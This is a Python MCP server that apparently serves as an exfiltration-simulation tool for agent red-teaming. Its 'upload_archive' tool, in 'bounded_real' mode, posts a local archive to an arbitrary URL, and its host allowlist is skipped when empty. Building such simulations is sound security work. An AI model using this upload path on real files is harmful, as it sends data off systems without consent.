#!/usr/bin/env python3
"""Exfiltration simulation MCP server."""

from __future__ import annotations

import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "_shared"))

import json
from pathlib import Path
from typing import Optional

import httpx
from fastmcp import FastMCP

mcp = FastMCP("exfil")


@mcp.tool()
def plan_exfil(archive_path: str, protocol: str, destination: str) -> str:
    """Create exfil simulation plan."""
    return json.dumps(
        {
            "success": True,
            "mode": "simulated",
            "archive_path": archive_path,
            "protocol": protocol,
            "destination": destination,
        }
    )


@mcp.tool()
async def upload_archive(
    archive_path: str,
    destination_url: str,
    mode: str = "simulated",
    allow_hosts: Optional[list[str]] = None,
) -> str:
    """Upload archive in bounded mode; simulated otherwise."""
    if mode != "bounded_real":
        return json.dumps(
            {
                "success": True,
                "mode": "simulated",
                "archive_path": archive_path,
                "destination_url": destination_url,
            }
        )

    path = Path(archive_path).expanduser().resolve()
    if not path.exists():
        return json.dumps({"success": False, "mode": "bounded_real", "error": "archive not found"})

    host = httpx.URL(destination_url).host
    allow = set(allow_hosts or [])
    if allow and host not in allow:
        return json.dumps({"success": False, "mode": "bounded_real", "error": f"host '{host}' not allowlisted"})

    async with httpx.AsyncClient(timeout=45.0) as client:
        with path.open("rb") as fh:
            resp = await client.post(destination_url, files={"file": fh})
    return json.dumps(
        {
            "success": 200 <= resp.status_code < 300,
            "mode": "bounded_real",
            "status_code": resp.status_code,
            "destination_url": destination_url,
        }
    )


if __name__ == "__main__":
    from server_entrypoint import parse_server_args, run_mcp_http_server
    args = parse_server_args(description="Exfil MCP server", default_port=8013)
    run_mcp_http_server(mcp, args=args)
